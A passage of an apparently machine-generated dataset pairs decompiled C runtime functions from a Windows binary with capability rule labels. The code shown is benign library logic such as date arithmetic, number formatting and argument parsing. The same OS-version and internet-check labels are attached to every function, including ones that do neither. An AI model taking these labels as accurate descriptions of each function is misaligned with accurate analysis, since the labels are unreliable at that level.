0;\n            }\n            iVar4 = (*pcVar2)(uVar3, 0, 0x4509f0, 0xffffffff, *0x44d944, 0x3f, 0, unaff_EBP + -0x1c);\n            if ((iVar4 == 0) || (*(unaff_EBP + -0x1c) != 0)) {\n                **0x44d944 = 0;\n            }\n            else {\n                (*0x44d944)[0x3f] = 0;\n            }\n        }\n    }\n    else {\n        if (*0x450a48 != 0) {\n            iVar4 = fcn.0041b910(arg_8h, *0x450a48);\n            if (iVar4 == 0) goto code_r0x0041d71a;\n            if (*0x450a48 != 0) {\n                fcn.00418911(*0x450a48);\n            }\n        }\n        iVar4 = fcn.004196b0(arg_8h);\n        *0x450a48 = fcn.004188ff(iVar4 + 1);\n        if (*0x450a48 != 0) {\n            fcn.004200e0(*0x450a48, arg_8h);\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0041d731();\n            fcn.00421eb0(*0x44d940, arg_8h, 3);\n            (*0x44d940)[3] = 0;\n            pcVar5 = arg_8h + 3;\n            if (*pcVar5 == '-') {\n                *(unaff_EBP + -0x20) = 1;\n                pcVar5 = arg_8h + 4;\n            }\n            *0x44d8b0 = fcn.00419e80(pcVar5);\n            *0x44d8b0 = *0x44d8b0 * 0xe10;\n            for (; (cVar1 = *pcVar5,  cVar1 == '+' || (('/' < cVar1 && (cVar1 < ':')))); pcVar5 = pcVar5 + 1) {\n            }\n            if (*pcVar5 == ':') {\n                pcVar5 = pcVar5 + 1;\n                iVar4 = fcn.00419e80(pcVar5);\n                *0x44d8b0 = *0x44d8b0 + iVar4 * 0x3c;\n                for (; ('/' < *pcVar5 && (*pcVar5 < ':')); pcVar5 = pcVar5 + 1) {\n                }\n                if (*pcVar5 == ':') {\n                    pcVar5 = pcVar5 + 1;\n                    iVar4 = fcn.00419e80(pcVar5);\n                    *0x44d8b0 = *0x44d8b0 + iVar4;\n                    for (; ('/' < *pcVar5 && (*pcVar5 < ':')); pcVar5 = pcVar5 + 1) {\n                    }\n                }\n            }\n            if (*(unaff_EBP + -0x20) != 0) {\n                *0x44d8b0 = -*0x44d8b0;\n            }\n            *0x44d8b4 = *pcVar5;\n            if (*0x44d8b4 == 0) {\n                **0x44d944 = 0;\n            }\n            else {\n                fcn.00421eb0(*0x44d944, pcVar5, 3);\n                (*0x44d944)[3] = 0;\n            }\n            goto code_r0x0041d7b8;\n        }\n    }\ncode_r0x0041d71a:\n    fcn.004181ba(unaff_EBP + -0x10, 0xffffffff);\ncode_r0x0041d7b8:\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 1663
    },
    "0041d7be": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0041d7be(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            int32_t arg_20h, int32_t arg_24h, int32_t arg_28h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = arg_10h % 4;\n    if (arg_ch == 1) {\n        if (((iVar2 == 0) && (arg_10h % 100 != 0)) || ((arg_10h + 0x76c) % 400 == 0)) {\n            iVar4 = *(in_EAX * 4 + 0x44dccc);\n        }\n        else {\n            iVar4 = *(in_EAX * 4 + 0x44dd00);\n        }\n        iVar5 = iVar4 + 1;\n        iVar3 = (arg_10h * 0x16d + -0x63db + (arg_10h + -1) / 4 + iVar5 + ((arg_10h + 299) / 400 - (arg_10h + -1) / 100)\n                ) % 7;\n        iVar1 = (arg_14h * 7 - iVar3) + arg_18h;\n        if (iVar3 <= arg_18h) {\n            iVar5 = iVar4 + -6;\n        }\n        iVar5 = iVar5 + iVar1;\n        if (arg_14h == 5) {\n            if (((iVar2 == 0) && (arg_10h % 100 != 0)) || ((arg_10h + 0x76c) % 400 == 0)) {\n                iVar1 = *(in_EAX * 4 + 0x44dcd0);\n            }\n            else {\n                iVar1 = *(in_EAX * 4 + 0x44dd04);\n            }\n            if (iVar1 < iVar5) {\n                iVar5 = iVar5 + -7;\n            }\n        }\n    }\n    else {\n        if (((iVar2 == 0) && (iVar1 = arg_10h / 100,  arg_10h % 100 != 0)) ||\n           (iVar1 = (arg_10h + 0x76c) / 400,  (arg_10h + 0x76c) % 400 == 0)) {\n            iVar5 = *(in_EAX * 4 + 0x44dccc);\n        }\n        else {\n            iVar5 = *(in_EAX * 4 + 0x44dd00);\n        }\n        iVar5 = iVar5 + arg_1ch;\n    }\n    iVar2 = (in_ECX * 0x3c + arg_20h) * 0x3c;\n    if (arg_8h == 1) {\n        *0x44d950 = (iVar2 + arg_24h) * 1000 + arg_28h;\n        *0x44d948 = arg_10h;\n        *0x44d94c = iVar5;\n    }\n    else {\n        *0x44d95c = (iVar2 + *0x44d8b8 + arg_24h) * 1000 + arg_28h;\n        if (*0x44d95c < 0) {\n            *0x44d95c = *0x44d95c + 86400000;\n            *0x44d958 = iVar5 + -1;\n        }\n        else {\n            iVar1 = 86400000;\n            *0x44d958 = iVar5;\n            if (86399999 < *0x44d95c) {\n                *0x44d95c = *0x44d95c + -86400000;\n                *0x44d958 = iVar5 + 1;\n            }\n        }\n        *0x44d954 = arg_10h;\n    }\n    return iVar1;\n}\n",
        "token_count": 950
    },
    "0041db87": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0041db87(int64_t *arg_8h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    bVar1 = false;\n    iVar5 = *(arg_8h + 4);\n    iVar4 = *arg_8h;\n    iVar8 = *arg_8h;\n    iVar2 = fcn.0041b5aa();\n    if (((iVar5 < 0) || (0x1000 < iVar5)) || ((0xfff < iVar5 && (iVar4 != 0)))) {\n        return NULL;\n    }\n    if (*(iVar2 + 0x44) == 0) {\n        iVar3 = fcn.004188ff(0x24);\n        *(iVar2 + 0x44) = iVar3;\n        if (iVar3 != 0) goto code_r0x0041dbed;\n        piVar6 = 0x450a50;\n    }\n    else {\ncode_r0x0041dbed:\n        piVar6 = *(iVar2 + 0x44);\n    }\n    iVar4 = fcn.0041a880(iVar4, iVar5, 0x1e13380, 0);\n    var_4h = iVar4 + 0x46;\n    iVar5 = iVar4 + 0x45;\n    iVar7 = fcn.0041a840(iVar4, iVar4 >> 0x1f, 0xfffffe93, 0xffffffff);\n    iVar7 = fcn.0041a840(iVar7 - (((iVar4 + 0x171) / 400 - iVar5 / 100) + -0x11 + iVar5 / 4), 0x15180, 0);\n    iVar7 = iVar7 + iVar8;\n    iVar2 = iVar7;\n    if ((iVar7 < 0x100000000) && (iVar7 < 0)) {\n        iVar7 = iVar7 + 0x1e13380;\n        var_4h = iVar5;\n        if (((iVar5 % 4 != 0) || (iVar5 % 100 == 0)) && ((iVar4 + 0x7b1) % 400 != 0)) goto code_r0x0041dce9;\n        iVar7 = CONCAT44((iVar7 >> 0x20) + (0xfffeae7f < iVar7), iVar2 + 0x1e28500);\n    }\n    else if (((var_4h % 4 != 0) || (var_4h % 100 == 0)) && ((iVar4 + 0x7b2) % 400 != 0)) goto code_r0x0041dce9;\n    bVar1 = true;\ncode_r0x0041dce9:\n    piVar6[5] = var_4h;\n    iVar5 = fcn.0041a880(iVar7, 0x15180, 0);\n    piVar6[7] = iVar5;\n    iVar8 = fcn.0041a840(iVar5, iVar5 >> 0x1f, 0xfffeae80, 0xffffffff);\n    iVar5 = 0x44dcd0;\n    if (!bVar1) {\n        iVar5 = 0x44dd04;\n    }\n    iVar2 = 1;\n    iVar4 = *(iVar5 + 4);\n    while (iVar4 < piVar6[7]) {\n        iVar2 = iVar2 + 1;\n        iVar4 = *(iVar5 + iVar2 * 4);\n    }\n    piVar6[4] = iVar2 + -1;\n    piVar6[3] = piVar6[7] - *(iVar5 + (iVar2 + -1) * 4);\n    iVar5 = fcn.0041a880(*arg_8h, *(arg_8h + 4), 0x15180, 0);\n    piVar6[6] = (iVar5 + 4) % 7;\n    iVar5 = fcn.0041a880(iVar8 + iVar7, 0xe10, 0);\n    piVar6[2] = iVar5;\n    iVar9 = fcn.0041a840(iVar5, iVar5 >> 0x1f, 0xfffff1f0, 0xffffffff);\n    iVar9 = iVar8 + iVar7 + iVar9;\n    iVar5 = fcn.0041a880(iVar9, 0x3c, 0);\n    piVar6[1] = iVar5;\n    *piVar6 = iVar9 + iVar5 * -0x3c;\n    piVar6[8] = 0;\n    return piVar6;\n}\n",
        "token_count": 1127
    },
    "0041df03": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041df03(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h != 0) {\n        fcn.00422463(&var_8h, arg_10h);\n        *arg_ch = var_8h;\n        arg_ch[1] = var_4h;\n        return;\n    }\n    fcn.004224a0(&arg_8h, arg_10h);\n    *arg_ch = arg_8h;\n    return;\n}\n",
        "token_count": 142
    },
    "0041df5e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041df5e(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t *in_EAX;\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *unaff_EBX;\n    \n    if (arg_10h != '\\0') {\n        fcn.0041df41();\n    }\n    if (*in_EAX == 0x2d) {\n        *unaff_EBX = 0x2d;\n        unaff_EBX = unaff_EBX + 1;\n    }\n    puVar1 = unaff_EBX;\n    if (0 < arg_8h) {\n        puVar1 = unaff_EBX + 1;\n        *unaff_EBX = *puVar1;\n        *puVar1 = *0x44dd44;\n    }\n    puVar1 = fcn.004200e0(puVar1 + arg_8h + (arg_10h == '\\0'), \"e+000\");\n    if (arg_ch != 0) {\n        *puVar1 = 0x45;\n    }\n    if (*in_EAX[3] != '0') {\n        iVar2 = in_EAX[1] + -1;\n        if (iVar2 < 0) {\n            iVar2 = -iVar2;\n            puVar1[1] = 0x2d;\n        }\n        if (99 < iVar2) {\n            iVar3 = iVar2 / 100;\n            iVar2 = iVar2 % 100;\n            puVar1[2] = puVar1[2] + iVar3;\n        }\n        if (9 < iVar2) {\n            iVar3 = iVar2 / 10;\n            iVar2 = iVar2 % 10;\n            puVar1[3] = puVar1[3] + iVar3;\n        }\n        puVar1[4] = puVar1[4] + iVar2;\n    }\n    return;\n}\n",
        "token_count": 442
    },
    "0041e078": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0041e078(uchar *arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uchar *puVar3;\n    \n    iVar1 = in_EAX[1];\n    if ((arg_10h != '\\0') && (iVar1 + -1 == arg_ch)) {\n        iVar2 = *in_EAX;\n        arg_8h[(iVar2 == 0x2d) + iVar1 + -1] = 0x30;\n        (arg_8h + (iVar2 == 0x2d) + iVar1 + -1)[1] = 0;\n    }\n    puVar3 = arg_8h;\n    if (*in_EAX == 0x2d) {\n        *arg_8h = 0x2d;\n        puVar3 = arg_8h + 1;\n    }\n    if (in_EAX[1] < 1) {\n        fcn.0041df41();\n        *puVar3 = 0x30;\n        puVar3 = puVar3 + 1;\n    }\n    else {\n        puVar3 = puVar3 + in_EAX[1];\n    }\n    if (0 < arg_ch) {\n        fcn.0041df41();\n        *puVar3 = *0x44dd44;\n        iVar1 = in_EAX[1];\n        if (iVar1 < 0) {\n            if ((arg_10h != '\\0') || (SBORROW4(arg_ch, -iVar1) == arg_ch + iVar1 < 0)) {\n                arg_ch = -iVar1;\n            }\n            fcn.0041df41();\n            fcn.004192e0(puVar3 + 1, 0x30, arg_ch);\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 427
    },
    "0041e7a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041e7a8(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uStack296;\n    uchar *puStack292;\n    uint uStack288;\n    uchar auStack272 [260];\n    uchar uStack12;\n    uint uStack8;\n    \n    uStack8 = *0x44d270;\n    uVar1 = 0;\n    do {\n        if (param_1 == *(uVar1 * 8 + 0x44d980)) break;\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 0x13);\n    if (param_1 == *(uVar1 * 8 + 0x44d980)) {\n        if ((*0x450778 == 1) || ((*0x450778 == 0 && (*0x44d26c == 1)))) {\n            uStack288 = 0;\n            puStack292 = &stack0x00000004;\n            uStack296 = *(uVar1 * 8 + 0x44d984);\n            uStack296 = fcn.004196b0();\n            (*_sym.imp.KERNEL32.dll_GetStdHandle)();\n            (*_sym.imp.KERNEL32.dll_WriteFile)();\n        }\n        else if (param_1 != 0xfc) {\n            uStack288 = 0x104;\n            puStack292 = &stack0xfffffef0;\n            uStack296 = 0;\n            uStack12 = 0;\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)();\n            if (iVar2 == 0) {\n                fcn.004200e0();\n            }\n            iVar2 = fcn.004196b0();\n            if (0x3c < iVar2 + 1U) {\n                fcn.004196b0();\n                fcn.00421eb0();\n            }\n            fcn.004196b0();\n            fcn.004196b0();\n            fcn.00418b80();\n            fcn.004200e0();\n            fcn.004200f0();\n            fcn.004200f0();\n            fcn.004200f0();\n            fcn.00423095(&stack0xfffffed8, \"Microsoft Visual C++ Runtime Library\", 0x12010);\n        }\n    }\n    uStack288 = 0x41e914;\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 539
    },
    "0041e958": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041e958(int32_t arg_8h, uint ExceptionInfo)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    uint var_4h;\n    \n    iVar4 = fcn.0041b5aa();\n    piVar1 = *(iVar4 + 0x54);\n    piVar7 = piVar1;\n    do {\n        if (*piVar7 == arg_8h) break;\n        piVar7 = piVar7 + 3;\n    } while (piVar7 < piVar1 + *0x44da9c * 3);\n    if ((piVar1 + *0x44da9c * 3 <= piVar7) || (*piVar7 != arg_8h)) {\n        piVar7 = NULL;\n    }\n    if ((piVar7 == NULL) || (pcVar2 = piVar7[2],  pcVar2 == NULL)) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(ExceptionInfo);\n    }\n    else if (pcVar2 == 0x5) {\n        piVar7[2] = 0;\n        uVar5 = 1;\n    }\n    else {\n        if (pcVar2 != 0x1) {\n            uVar5 = *(iVar4 + 0x58);\n            *(iVar4 + 0x58) = ExceptionInfo;\n            if (piVar7[1] == 8) {\n                if (*0x44da90 < *0x44da94 + *0x44da90) {\n                    iVar6 = *0x44da90 * 0xc;\n                    iVar8 = *0x44da90;\n                    do {\n                        *(iVar6 + 8 + *(iVar4 + 0x54)) = 0;\n                        iVar8 = iVar8 + 1;\n                        iVar6 = iVar6 + 0xc;\n                    } while (iVar8 < *0x44da94 + *0x44da90);\n                }\n                iVar8 = *piVar7;\n                uVar3 = *(iVar4 + 0x5c);\n                if (iVar8 == -0x3fffff72) {\n                    *(iVar4 + 0x5c) = 0x83;\n                }\n                else if (iVar8 == -0x3fffff70) {\n                    *(iVar4 + 0x5c) = 0x81;\n                }\n                else if (iVar8 == -0x3fffff6f) {\n                    *(iVar4 + 0x5c) = 0x84;\n                }\n                else if (iVar8 == -0x3fffff6d) {\n                    *(iVar4 + 0x5c) = 0x85;\n                }\n                else if (iVar8 == -0x3fffff73) {\n                    *(iVar4 + 0x5c) = 0x82;\n                }\n                else if (iVar8 == -0x3fffff71) {\n                    *(iVar4 + 0x5c) = 0x86;\n                }\n                else if (iVar8 == -0x3fffff6e) {\n                    *(iVar4 + 0x5c) = 0x8a;\n                }\n                (*pcVar2)(8, *(iVar4 + 0x5c));\n                *(iVar4 + 0x5c) = uVar3;\n            }\n            else {\n                piVar7[2] = 0;\n                (*pcVar2)(piVar7[1]);\n            }\n            *(iVar4 + 0x58) = uVar5;\n        }\n        uVar5 = 0xffffffff;\n    }\n    return uVar5;\n}\n",
        "token_count": 855
    },
    "0041ebe0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ebe0(uint8_t **arg_8h, int32_t *arg_ch)\n\n{\n    bool bVar1;\n    bool bVar2;\n    uint8_t *in_EAX;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    uint8_t *in_ECX;\n    uint32_t uVar6;\n    int32_t *unaff_ESI;\n    uint var_4h;\n    \n    bVar1 = false;\n    *unaff_ESI = 0;\n    *arg_ch = 1;\n    if (arg_8h != NULL) {\n        *arg_8h = in_ECX;\n        arg_8h = arg_8h + 1;\n    }\n    do {\n        if (*in_EAX == 0x22) {\n            bVar1 = !bVar1;\n            puVar3 = in_EAX + 1;\n            uVar5 = 0x22;\n        }\n        else {\n            *unaff_ESI = *unaff_ESI + 1;\n            if (in_ECX != NULL) {\n                *in_ECX = *in_EAX;\n                in_ECX = in_ECX + 1;\n            }\n            uVar5 = *in_EAX;\n            puVar3 = in_EAX + 1;\n            if ((*(uVar5 + 0x452001) & 4) != 0) {\n                *unaff_ESI = *unaff_ESI + 1;\n                if (in_ECX != NULL) {\n                    *in_ECX = *puVar3;\n                    in_ECX = in_ECX + 1;\n                }\n                puVar3 = in_EAX + 2;\n            }\n            if (uVar5 == 0) {\n                puVar3 = puVar3 + -1;\n                goto code_r0x0041ec59;\n            }\n        }\n        in_EAX = puVar3;\n    } while ((bVar1) || ((uVar5 != 0x20 && (uVar5 != 9))));\n    if (in_ECX != NULL) {\n        in_ECX[-1] = 0;\n    }\ncode_r0x0041ec59:\n    bVar1 = false;\n    while (*puVar3 != 0) {\n        for (; (*puVar3 == 0x20 || (*puVar3 == 9)); puVar3 = puVar3 + 1) {\n        }\n        if (*puVar3 == 0) break;\n        if (arg_8h != NULL) {\n            *arg_8h = in_ECX;\n            arg_8h = arg_8h + 1;\n        }\n        *arg_ch = *arg_ch + 1;\n        while( true ) {\n            bVar2 = true;\n            uVar6 = 0;\n            for (; *puVar3 == 0x5c; puVar3 = puVar3 + 1) {\n                uVar6 = uVar6 + 1;\n            }\n            if (*puVar3 == 0x22) {\n                puVar4 = puVar3;\n                if ((uVar6 & 1) == 0) {\n                    if ((!bVar1) || (puVar4 = puVar3 + 1,  *puVar4 != 0x22)) {\n                        bVar2 = false;\n                        puVar4 = puVar3;\n                    }\n                    bVar1 = !bVar1;\n                }\n                uVar6 = uVar6 >> 1;\n                puVar3 = puVar4;\n            }\n            for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n                if (in_ECX != NULL) {\n                    *in_ECX = 0x5c;\n                    in_ECX = in_ECX + 1;\n                }\n                *unaff_ESI = *unaff_ESI + 1;\n            }\n            uVar5 = *puVar3;\n            if ((uVar5 == 0) || ((!bVar1 && ((uVar5 == 0x20 || (uVar5 == 9)))))) break;\n            if (bVar2) {\n                if (in_ECX == NULL) {\n                    if ((*(uVar5 + 0x452001) & 4) != 0) {\n                        puVar3 = puVar3 + 1;\n                        *unaff_ESI = *unaff_ESI + 1;\n                    }\n                }\n                else {\n                    if ((*(uVar5 + 0x452001) & 4) != 0) {\n                        *in_ECX = uVar5;\n                        in_ECX = in_ECX + 1;\n                        puVar3 = puVar3 + 1;\n                        *unaff_ESI = *unaff_ESI + 1;\n                    }\n                    *in_ECX = *puVar3;\n                    in_ECX = in_ECX + 1;\n                }\n                *unaff_ESI = *unaff_ESI + 1;\n            }\n            puVar3 = puVar3 + 1;\n        }\n        if (in_ECX != NULL) {\n            *in_ECX = 0;\n            in_ECX = in_ECX + 1;\n        }\n        *unaff_ESI = *unaff_ESI + 1;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = NULL;\n    }\n    *arg_ch = *arg_ch + 1;\n    return;\n}\n",
        "token_count": 1212
    },
    "0041ef10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041ef10(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t *piVar9;\n    uchar auStack68 [46];\n    int16_t iStack22;\n    int32_t *piStack20;\n    \n    puVar3 = fcn.004188ff(0x480);\n    if (puVar3 == NULL) {\n        uVar4 = 0xffffffff;\n    }\n    else {\n        *0x450e88 = 0x20;\n        *0x450ea0 = puVar3;\n        for (; puVar3 < *0x450ea0 + 0x120; puVar3 = puVar3 + 9) {\n            *puVar3 = 0xffffffff;\n            puVar3[2] = 0;\n            *(puVar3 + 1) = 0;\n            *(puVar3 + 5) = 10;\n        }\n        (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(auStack68);\n        if ((iStack22 != 0) && (piStack20 != NULL)) {\n            iVar8 = *piStack20;\n            piStack20 = piStack20 + 1;\n            piVar9 = iVar8 + piStack20;\n            if (0x7ff < iVar8) {\n                iVar8 = 0x800;\n            }\n            iVar6 = iVar8;\n            if (*0x450e88 < iVar8) {\n                puVar3 = 0x450ea4;\n                do {\n                    puVar5 = fcn.004188ff(0x480);\n                    iVar6 = *0x450e88;\n                    if (puVar5 == NULL) break;\n                    *0x450e88 = *0x450e88 + 0x20;\n                    *puVar3 = puVar5;\n                    puVar2 = puVar5;\n                    for (; puVar5 < puVar2 + 0x120; puVar5 = puVar5 + 9) {\n                        *puVar5 = 0xffffffff;\n                        puVar5[2] = 0;\n                        *(puVar5 + 1) = 0;\n                        *(puVar5 + 5) = 10;\n                        puVar2 = *puVar3;\n                    }\n                    puVar3 = puVar3 + 1;\n                    iVar6 = iVar8;\n                } while (*0x450e88 < iVar8);\n            }\n            uVar7 = 0;\n            if (0 < iVar6) {\n                do {\n                    if (((*piVar9 != -1) && ((*piStack20 & 1) != 0)) &&\n                       (((*piStack20 & 8) != 0 || (iVar8 = (*_sym.imp.KERNEL32.dll_GetFileType)(*piVar9),  iVar8 != 0)))\n                       ) {\n                        piVar1 = *((uVar7 >> 5) * 4 + 0x450ea0) + (uVar7 & 0x1f) * 0x24;\n                        *piVar1 = *piVar9;\n                        *(piVar1 + 1) = *piStack20;\n                        iVar8 = fcn.00421e19(piVar1 + 3, 4000);\n                        if (iVar8 == 0) {\n                            return 0xffffffff;\n                        }\n                        piVar1[2] = piVar1[2] + 1;\n                    }\n                    piVar9 = piVar9 + 1;\n                    uVar7 = uVar7 + 1;\n                    piStack20 = piStack20 + 1;\n                } while (uVar7 < iVar6);\n            }\n        }\n        iVar8 = 0;\n        do {\n            piVar9 = *0x450ea0 + iVar8 * 9;\n            if (*piVar9 == -1) {\n                *(piVar9 + 1) = 0x81;\n                if (iVar8 == 0) {\n                    iVar6 = -10;\n                }\n                else {\n                    iVar6 = -0xb - (iVar8 != 1);\n                }\n                iVar6 = (*_sym.imp.KERNEL32.dll_GetStdHandle)(iVar6);\n                if ((iVar6 == -1) || (uVar7 = (*_sym.imp.KERNEL32.dll_GetFileType)(iVar6),  uVar7 == 0)) {\n                    *(piVar9 + 1) = *(piVar9 + 1) | 0x40;\n                }\n                else {\n                    *piVar9 = iVar6;\n                    if ((uVar7 & 0xff) == 2) {\n                        *(piVar9 + 1) = *(piVar9 + 1) | 0x40;\n                    }\n                    else if ((uVar7 & 0xff) == 3) {\n                        *(piVar9 + 1) = *(piVar9 + 1) | 8;\n                    }\n                    iVar6 = fcn.00421e19(piVar9 + 3, 4000);\n                    if (iVar6 == 0) {\n                        return 0xffffffff;\n                    }\n                    piVar9[2] = piVar9[2] + 1;\n                }\n            }\n            else {\n                *(piVar9 + 1) = *(piVar9 + 1) | 0x80;\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 3);\n        (*_sym.imp.KERNEL32.dll_SetHandleCount)(*0x450e88);\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 1261
    },
    "0041f35a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl fcn.0041f35a(uint arg_8h_2, uint arg_ch_2, uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uchar uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint uVar9;\n    uint uVar10;\n    uint32_t uVar11;\n    uint8_t uVar12;\n    uint8_t uVar13;\n    uint32_t uVar14;\n    uint *puVar15;\n    int32_t unaff_EBP;\n    uint8_t *puVar16;\n    uint8_t *puVar17;\n    char *pcVar18;\n    char *pcVar19;\n    uint *puVar20;\n    uint8_t *puVar21;\n    ulong uVar22;\n    uint var_4h;\n    uint var_1e8h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_194h;\n    uint var_18ch;\n    uint var_184h;\n    uint var_17dh;\n    uint var_1ch;\n    uint var_18h;\n    uint var_4h_2;\n    uint uStack4;\n    \n    uStack4 = 0x1cc;\n    var_4h_2 = 0x4422c8;\n    fcn.00419d14();\n    *(unaff_EBP + -0x1c) = *0x44d270;\n    *(unaff_EBP + -0x1bc) = 0;\n    *(unaff_EBP + -0x1d8) = 0;\n    *(unaff_EBP + -0x1b0) = 0;\n    *(unaff_EBP + -0x194) = 0;\n    *(unaff_EBP + -0x195) = 0;\n    *(unaff_EBP + -0x184) = 0;\n    *(unaff_EBP + -0x1b8) = 0;\ncode_r0x0041f39d:\n    if (**(unaff_EBP + 0xc) == '\\0') {\ncode_r0x0042008f:\n        if (*(unaff_EBP + -0x1d8) == 1) {\n            fcn.00418911(*(unaff_EBP + -0x1bc));\n        }\n        *(unaff_EBP + -0x1ec) = 0x4200d0;\n        fcn.004192ca();\n        *(unaff_EBP + -0x1ec) = 0x4200d5;\n        fcn.00419d4f();\n        return;\n    }\n    iVar7 = fcn.00421559(**(unaff_EBP + 0xc));\n    if (iVar7 != 0) {\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n        do {\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            iVar7 = fcn.0041f344();\n            iVar8 = fcn.00421559(iVar7);\n        } while (iVar8 != 0);\n        if (iVar7 != -1) {\n            fcn.004232b3(iVar7, *(unaff_EBP + 8));\n        }\n        do {\n            *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) + 1;\n            iVar7 = fcn.00421559(**(unaff_EBP + 0xc));\n        } while (iVar7 != 0);\n        goto code_r0x0041f39d;\n    }\n    puVar21 = *(unaff_EBP + 0xc);\n    if (*puVar21 != 0x25) {\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 